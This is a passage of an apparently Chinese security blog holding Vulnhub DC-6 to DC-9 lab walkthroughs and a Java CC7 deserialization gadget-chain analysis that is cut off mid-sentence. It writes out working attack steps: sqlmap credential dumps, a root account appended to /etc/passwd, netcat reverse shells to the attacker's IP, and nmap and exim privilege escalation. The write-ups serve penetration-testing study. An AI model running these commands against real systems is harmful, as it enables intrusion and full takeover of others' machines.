alt="image-20230710215927048"><br>然后使用nc都敲一遍<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102159850.png" alt="image-20230710215950798"><br>然后使用nmap发现22端口打开<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102200168.png" alt="image-20230710220008671"><br>接着把刚刚爆出来的用户密码全部弄一个张表，最终爆出来下面几个用户<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102200215.png" alt="image-20230710220044501"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102200040.png" alt="image-20230710220056987"><br>三个用户经查看啥都没用，但是在用户janitor得到一些列密码<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102201983.png" alt="image-20230710220113563"><br>加入到我们刚刚生成的密码中再爆一次，得到一个新用户<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102201412.png" alt="image-20230710220131358"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们执行<code>sudo -l</code>看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102201614.png" alt="image-20230710220146891"><br>进入这个目录没啥发现，返回上两层发现一个test.py文件<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102201582.png" alt="image-20230710220159542"><br>最终发现它有着写入目录的功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过向&#x2F;etc&#x2F;passwd中添加用户达到提权，并且密码需要加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt admin1 123456</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102202833.png" alt="image-20230710220214807"><br>在Linux上执行，然后跳转到&#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test目录下使用echo命令在&#x2F;tmp目录下创建一个文件，文件名自定义就行，我使用user，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;admin:$1$admin1$kBcb8DdRJKeqQ2e6acZ0J0:0:0::/root:/bin/bash&#x27; &gt;&gt; /tmp/user</span><br></pre></td></tr></table></figure><p>创建完之后使用sudo命令执行user文件将&#x2F;tmp&#x2F;test1的内容写入到&#x2F;etc&#x2F;passwd文件中，然后使用sudo命令执行test文件将&#x2F;tmp&#x2F;user的内容写入到&#x2F;etc&#x2F;passwd文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./test /tmp/passwd /etc/passwd</span><br></pre></td></tr></table></figure><p>然后切换账户提权成功<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102202264.png" alt="image-20230710220228195"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-8</title>
      <link href="/undefined/36138.html"/>
      <url>/undefined/36138.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>下载地址：<a href="https://download.vulnhub.com/dc/DC-8.zip">https://download.vulnhub.com/dc/DC-8.zip</a></p><h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102142896.png" alt="image-20230710214105893"><br>访问IP，得到为Drupal 7和DC-7一模一样，没啥思路扫个目录看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102144538.png" alt="image-20230710214246015"><br>版本为7.67，msf上没有啥漏洞，但是这里肯定是直接漏洞利用，于是找到了如下界面的sql注入<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102145659.png" alt="image-20230710214453951"><br>直接上sqlmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.141/?nid=1&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102145465.png" alt="image-20230710214534488"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.141/?nid=1&quot; -D d7db --table</span><br></pre></td></tr></table></figure><p>然后找到如下表，进入看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102146562.png" alt="image-20230710214636451"><br>最终找到字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.141/?nid=1&quot; -D d7db -T users -C name,pass --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102146811.png" alt="image-20230710214656747"><br>接着使用jhon去爆破它，把这两行密码复制到记事本里然后去爆破<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102147518.png" alt="image-20230710214708462"><br>爆破结果为<code>john/turtle</code>，然后在下面插入代码<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102147987.png" alt="image-20230710214719930"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102147628.png" alt="image-20230710214729585"><br>然后将shell转为交互式shell<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102147680.png" alt="image-20230710214740153"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102148572.png" alt="image-20230710214811512"><br>有个exim4这里试一下，先看下版本<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102148762.png" alt="image-20230710214837694"><br>exim4提权需要写权限，而在这个目录下没用，那么切换到tmp目录下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102148679.png" alt="image-20230710214851580"><br>复制下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh /home/joker27</span><br></pre></td></tr></table></figure><p>然后python起服务将文件下载到靶机上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;http://192.168.75.128:8000/46996.sh&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102149296.png" alt="image-20230710214903242"><br>然后赋予执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 46996.sh</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./46996.sh -m netcat</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102149889.png" alt="image-20230710214913825"><br>得赶快执行，不然会失去root<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102149961.png" alt="image-20230710214923860"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-7</title>
      <link href="/undefined/35178.html"/>
      <url>/undefined/35178.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>下载地址：<a href="https://download.vulnhub.com/dc/DC-7.zip">https://download.vulnhub.com/dc/DC-7.zip</a></p><h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><p>存活IP扫描<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101545737.png" alt="image-20230710154535976"><br>访问页面，内容为Drupal的CMS<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546614.png" alt="image-20230710154607577"><br>页面上面没啥东西，但是页面下有<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546544.png" alt="image-20230710154617505"><br>百度一下这个用户发现为其GitHub<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546648.png" alt="image-20230710154627596"><br>访问其config.php得到数据库账号密码，但是登录不上却可以登录ssh<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546146.png" alt="image-20230710154646095"><br>连接如下<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546247.png" alt="image-20230710154656166"><br>打开mbox发现存在<code>/opt/scripts/backups.sh</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547561.png" alt="image-20230710154719484"><br>访问其目录，查看backups.sh<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547994.png" alt="image-20230710154736908"><br>发现有个drush命令，但是不知道其作用，搜索后发现这个命令可以修改密码，进入到var&#x2F;www&#x2F;html使用其命令修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=&quot;123456&quot;</span><br></pre></td></tr></table></figure><p>然后利用这个账号密码去登陆<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547364.png" alt="image-20230710154749303"><br>在Content—&gt;Add content–&gt;Basic page下准备写马但是不支持，将php进行引入!<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547449.png" alt="image-20230710154758394"><br>如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548482.png" alt="image-20230710154812450"><br>然后把这个扩展开启了再进入刚刚那个界面<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548082.png" alt="image-20230710154820011"><br>然后写入木马<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548475.png" alt="image-20230710154835443"><br>最后用4连上了，奇奇怪怪<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548880.png" alt="image-20230710154845834"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>进入opt目录，写入打开终端然后写入提权的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.75.128 6666 &gt;/tmp/f&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure><p>emmmm，使用这个命令成功了但是执行命令老是失败，弹个shell试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.75.158 6666</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548691.png" alt="image-20230710154855636"><br>执行命令，这里要稍微等一会儿<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101549662.png" alt="image-20230710154922627"><br>拿到root权限<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101549169.png" alt="image-20230710154932069"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-6</title>
      <link href="/undefined/18859.html"/>
      <url>/undefined/18859.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>下载地址：<a href="https://download.vulnhub.com/dc/DC-6.zip">https://download.vulnhub.com/dc/DC-6.zip</a></p><h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><p>存活IP扫描<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091912733.png" alt="image-20230709190836443"><br>访问IP显示域名但无法解析，和前面有台DC靶机一样，这里我在win下修改hosts文件，打开这个文件<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091913352.png" alt="image-20230709191335290"><br>然后正常访问，网站是WordPress的CMS，直接永wpscan先扫一波，这个竟然没扫到登录界面，dirsearch再扫一波找到<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091913908.png" alt="image-20230709191345851"><br>再使用wpscan扫一波用户名，得到5个用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url wordy -e u</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091913053.png" alt="image-20230709191354956"><br>然后是爆破密码 ，这里vulnhub给了提示让用哪个字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OK, this isn&#x27;t really a clue as such, but more of some &quot;we don&#x27;t want to spend five years waiting for a certain process to finish&quot; kind of advice for those who just want to get on with the job.</span><br><span class="line"></span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</span><br></pre></td></tr></table></figure><p>那么去生成一下字典，这里新版kali可能没用解压这个文件需要解压一下，生成命名直接用提示的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure><p>不要copy数据有点多🤔，然后去爆破吧，这里路径什么的自己要注意</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url wordy --enumerate u -P passwords.txt</span><br></pre></td></tr></table></figure><p>得到账号密码<code>mark helpdesk01</code>然后登录上去发现有个Activity monitor看wp说这个是有漏洞的<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091914208.png" alt="image-20230709191455156"></p><h2 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h2><p>这个我也没接触过，看页面好像是个登录日志功能，msf搜一下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091914719.png" alt="image-20230709191440660"><br>用这个尝试一下，先copy看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</span><br></pre></td></tr></table></figure><p>打开看到有个反弹shell的代码<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915132.png" alt="image-20230709191509096"><br>那么把域名和IP改一下就行，然后就利用失败，没办法手动来吧，抓个命令执行点的包如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915091.png" alt="image-20230709191524042"><br>添加要执行的命令<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915307.png" alt="image-20230709191535273"><br>拿到shell利用python转换为交互式shell，然后就是提权了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先看一下哪些命令具有suid权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>没发现我熟悉的东西，进入home目录看看，通过一番目录查看找到了提示文件things-to-do.txt<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915324.png" alt="image-20230709191549243"><br>得到了graham用户的密码，那么去这个用户下看看，翻了下文件没啥东西，查看当前用户的权限<code>sudo -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916387.png" alt="image-20230709191602340"><br>这个用户可以以jens用户来运行backups.sh先打开看看，发现没啥东西，但是我们可以进行写入操作，那么写入<code>echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</code>这样能将shell切换到jens用户，写入后以jens用户执行文件<code>sudo -u jens ./backups.sh</code>成功切换shell<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916468.png" alt="image-20230709191616408"><br>那么再查看一下当前用户的权限<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916466.png" alt="image-20230709191631408"><br>可以用root来运行nmap并且不需要密码，那么可以使用nmap提权，nmap有执行脚本的功能，通过编写特殊脚本，可以实现利用nmap提权<br>这里nmap提权分了两种，其实就是不同版本下的方式</p><ol><li>旧版本提权<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 进入nmap的交互模式</span><br><span class="line">nmap --interactive</span><br><span class="line"># 执行sh，提权成功</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure></li><li>新版本提权<br>写入一个执行bash的nmap脚本，运行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br><span class="line">sudo nmap --script=$TF</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916759.png" alt="image-20230709191645705"><br>提权成功，拿flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916290.png" alt="image-20230709191657223"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java学习之CC链7</title>
      <link href="/undefined/45911.html"/>
      <url>/undefined/45911.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>CommonsCollections 3.1 - 3.2.1，jdk好像是没有限制的</p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>这里其实后半部分和CC1也是一样只不过入口点变了，这里为<code>Hashtable</code>这个类，找样是把他和<code>LazyMap</code>连起来，但是这里不直接去find usages了，因为get调用实在太多了，所以直接看，最后是找到了<code>AbstractMap</code>类，它的<code>equals()</code>方法调用了<code>get()</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091350772.png" alt="image-20230709134923730"><br>那么下一步就是找谁调用了<code>equals()</code>方法，从这里开始会遇到前面几条链没有过的调用方式就是调用子类没有的方法那么就会去到父类调用这个方法，所以在这里<code>HashMap</code>这个类继承了<code>AbstractMap</code>类<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091350873.png" alt="image-20230709135028795"><br>而<code>HashMap</code>类没有<code>equals()</code>方法那么调用<code>HashMap</code>类<code>equals()</code>方法就会调到<code>AbstractMap</code>类的<code>equals()</code>方法所以接下来就去寻找调用了<code>key.equals</code>我们控制key的类型为HashMap就行了，最终是在<code>HashTable</code>类的<code>reconstitutionPut()</code>方法调用了<code>key.equals</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091350009.png" alt="image-20230709135043925"><br>其实这里<code>equals</code>的调用还是挺绕的，一开始是传LazyMap对象到<code>AbstractMap</code>类去调用<code>equals</code>就相当于LazyMap调用<code>equals</code>但是LazyMap没有<code>equals</code>所以就去LazyMap的父类<code>AbstractMapDecorator</code>找虽然<code>AbstractMapDecorator</code>是一个抽象类，但它实现了<code>equals</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123; </span><br><span class="line"><span class="comment">//判断当前对象与传入对象是否为同一个对象</span></span><br><span class="line">    <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> map.equals(object);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>AbstractMapDecorator</code>类的<code>equals</code>方法只比较了这两个key的引用，如果不是同一对象会再次调用<code>equals</code>方法，map是通过<code>LazyMap</code>传过来的相当于是<code>LazyMap</code>的对象，我们在构造利用链的时候，通过<code>LazyMap</code>的静态方法<code>decorate</code>将<code>HashMap</code>传给了map属性，因此这里会调用<code>HashMap</code>的<code>equals</code>方法。所以又去<code>AbstractMapDecorator</code>父类即<code>AbstractMap</code>类找最终找到调用了<code>equals</code>然后再<code>AbstractMap</code>类去调用<code>LazyMap</code>调用get，这里想了半天<code>AbstractMapDecorator</code>类怎么和<code>HashMap</code>扯上关系的<br>现在就是找谁调用了<code>reconstitutionPut()</code>方法，最终在同一个类即<code>HashTable</code>类的<code>readObject()</code>方法调用了<code>reconstitutionPut()</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351732.png" alt="image-20230709135106646"><br>那么到这里链子就分析完了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351548.png" alt="image-20230709135114488"></p><h2 id="EXP调试"><a href="#EXP调试" class="headerlink" title="EXP调试"></a>EXP调试</h2><p>这里先把CC1的后半段拿过来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是和<code>AbstractMap</code>类连起来但是这个类是不可以序列化的，所以这里不太好写这一部分的exp就直接往后吧，下一步就是和入口类的<code>reconstitutionPut</code>方法结合起来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;  </span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里对传进的 Entry 对象数组进行了循环，逐个调用<code>e.key.equals(key)</code>，这里传进去的参数key如果是我们可控的，那么<code>AbstractMap.equals()</code>中的m就是我们可控的。那么这里在入口类传入恶意key然后调用<code>key.equals</code>就可行，像下面这样<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351569.png" alt="image-20230709135145421"><br>但结果是没反应，说明这样不行debug发现根本不会进入<code>equals</code>方法，去看看yso官方链子<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351189.png" alt="image-20230709135138136"><br>这里用了两个map并且使用了两次put，下面就分析一下为什么要这样做，这里可以详细了解一下<code>reconstitutionPut</code>方法，<a href="https://blog.csdn.net/qq_35733751/article/details/119862728">参考博客</a>这里就不重复写了</p><ul><li><strong>为什么要调用两次put</strong><br>因为我们需要进入到<code>reconstitutionPut()</code>方法里面的for循环去调用<code>e.key.equal()</code>但是发现<br>第一次调用的时候直接跳出了for循环因为这个时候<code>tab[index]</code>为空，然后在后面才给<code>tab[index]</code>赋值，所以这里需要调用两次来确保进入for循环<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091352691.png" alt="image-20230709135205523"><br>然后这里还有个<code>e.hash == hash</code>判断，在判断重复元素的时候校验了两个元素的hash值是否一样，为真后才会执行到<code>e.key.equal()</code>，而这个取出来判断的其实就是lazyMap1对象的hash值它要等于 现在的对象也就是 lazyMap2 的hash值，这个hash值是在lazyMap对象中的 <code>key.hashCode()</code> 得到的，而在这里我们put到lazyMap1的值yy然后去计算 <code>&quot;yy&quot;.hashCode()</code> ，lazyMap2 的为zZ就再<code>&quot;zZ&quot;.hashCode()</code>这样经计算他们的hash值是一样的，当然这里可以用其它字母组合不一定是这两个，参考<a href="https://blog.csdn.net/qq_64201116/article/details/128401981">清风师傅的博客</a>里面详细解释了这里的计算原理<br>然后这里还有个问题，就是在<code>HashTable.put()</code> 